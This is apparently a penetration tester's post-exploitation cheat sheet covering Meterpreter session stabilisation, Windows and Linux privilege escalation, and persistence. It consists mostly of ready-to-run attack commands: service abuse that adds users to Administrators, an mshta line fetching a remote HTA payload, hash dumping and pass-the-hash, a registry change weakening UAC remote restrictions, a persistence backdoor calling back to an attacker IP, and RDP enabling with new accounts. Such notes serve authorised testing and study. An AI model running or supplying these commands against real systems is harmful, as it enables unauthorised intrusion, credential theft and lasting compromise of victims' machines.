# Stable (Stabilize session)
## MSF Migrate
* `migrate` to a process that has higher chances of not being killed (e.g. from browser processes to system processes)
* `run <double_tabs>` - select meterpreter scripts

# Privileged (PrivEsc sessions)
## Windows Privilege Escalation
#### Metasploit
* `meterpreter> getsystem` - doesn't work when UAC is enabled and user is not admin
* `meterpreter> use incognito` - use commands from this module (e.g. `list_tokens`)
  * if `impersonate_token` doesn't work, migrate to a different process first (e.g. _w3wp_)
* `run post/multi/recon/local_exploit_suggester`
</br>__UAC__</br>
* `meterpreter> run post/windows/gather/win_privs` - check UAC enabled
* `msf> search bypassuac` - `use` module, `set` configs and `exploit`
  * `meterpreter> getsystem` - will work if user on the new session is admin (with UAC enabled also)
* manual - https://github.com/hfiref0x/UACME

#### Tools
PowerUp - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</br>
* `. ./PowerUp.ps1`
* `Invoke-CheckAll`
* when running functuions from PowerUp remember to check commands of exploits
  * `Invoke-ServiceAbuse -Name AppReadiness -Command "net localgroup administrators bob /add"`

WinPeas - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</br>

#### General
* unquoted service paths
  * `wmic service get name,displayname,pathname,startmode | findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """` - find unquoted services
  * `msf> use exploit/windows/local/unquoted_service_path` - module for exploiting unquoted path vulnerable instances
* abuse services
  * _AppReadiness_
    * add users to Administrators group - `sc config AppReadiness binPath= "cmd /c net localgroup Administrators <current-user> /add`
    * get system using Microsoft HTA (with powershell) - `Invoke-ServiceAbuse -Name AppReadiness  -Command "mshta.exe http://10.10.15.3:8080/ljUAsN.hta"`
 

## Linux Privilege Escalation
* SUDO - https://gtfobins.github.io/
* SUID - https://gtfobins.github.io/#+suid
* Replace executable
* crontab
* root squashing

# Persistent (maintaining access)
## Hashes
* `meterpreter> run hashdump` - if it crashes (elevate privileges or migrate to another process)
* `meterpreter> run post/windows/gather/smart_hashdump`
* pass-the-hash -> `use exploit/windows/smb/psexec` - works with administrator account (possible issues with users in Admin group, but not Administrator)
  * if no access to admin shares (Access_Denied in msf for psexec) - `meterpreter> reg setval -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System' -v LocalAccountTokenFilterPolicy -t REG_DWORD -d 1` and rerun psexec
* pass-the-hash over RDP -> `xfreerdp /u:<user> /d:<domain> /pth:<token> /v:<target>`

#### Mimikatz
* `sysinfo` - check on which processes meterpreter runs. It needs to be x64 for Mimikatz
* `ps -A x86_64 -s` list SYSTEM processes on x64 architecture
* `migrate <PID>` - migrate to a x64 processes
* `load mimikatz`

## Enable RDP service
* `net start` - check enabled services
* `wmic service where 'Caption like "Remote%" and started=true' get Caption` - check enabled remote services
* `meterpreter> <service_manager/enum_services>`
* `meterpreter> run getui -e << -u <new_username> -p <new_password>>>` - enable RDP
* `net localgroup "<RDP-Group-With-Allow-Perm>" <user> /add` - add user to the group allowed to RDP connections

## Backdoor
* `run persistence -A -X -i 5 -p <port> -r <attacker_IP>` - works only on Windows
* start `exploit/multi/handler` with the above configs (port/IP/payload)

## New Users
* `net user <username> <passowrd> /add` - adds new user
* `net localgroup "<group_name>" <username> /add` - adds existing user to a specific group that allows external connections (RDP, telnet, ssh etc.)

## DLL Hijacking (Windows)
* abuses the __DLL Search Order__
1. Directory from where the app is running
2. C:\Windows\System32 directory
3. C:\Windows\System directory
4. C:\Windows directory
5. Current directory at the time of execution
6. Any directory specified in %PATH%


## Cool Resources
* https://wiki.zacheller.dev/pentest/post-exploitation/maintaining-access
* https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
